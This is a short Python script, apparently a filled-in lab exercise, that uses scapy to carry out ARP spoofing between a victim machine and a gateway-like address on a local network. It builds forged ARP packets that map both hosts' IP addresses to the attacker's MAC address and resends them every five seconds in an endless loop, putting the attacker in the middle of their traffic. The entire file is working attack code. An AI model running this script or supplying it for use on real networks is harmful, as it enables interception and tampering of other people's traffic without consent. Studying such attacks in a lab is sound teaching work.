from scapy.all import *
import time

# complete with the appropriate values
macAttacker = "10:a5:1d:c8:82:4b"
ipAttacker = "192.168.0.100"

macVictim = "30:68:93:1D:0E:B8"
ipVictim = "192.168.0.102"

ipToSpoof = "192.168.0.1"#"192.168.0.105"
macToSpoof = "1C:3B:F3:E8:E9:4C"#"70:08:94:29:b8:f3"


arp= Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker           # fill the gaps
arp[ARP].psrc = ipToSpoof            # fill the gaps
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim            # fill the gaps

sendp(arp, iface="wlp0s20f3")

arp2 = Ether() / ARP()
arp2[Ether].src = macAttacker
arp2[ARP].hwsrc = macAttacker           # fill the gaps
arp2[ARP].psrc = ipVictim # fill the gaps
arp2[ARP].hwdst = macToSpoof
arp2[ARP].pdst = ipToSpoof # fill the gaps

sendp(arp2, iface="wlp0s20f3")

while 1:
    sendp(arp, iface="wlp0s20f3")
    sendp(arp2, iface="wlp0s20f3")
    time.sleep(5);
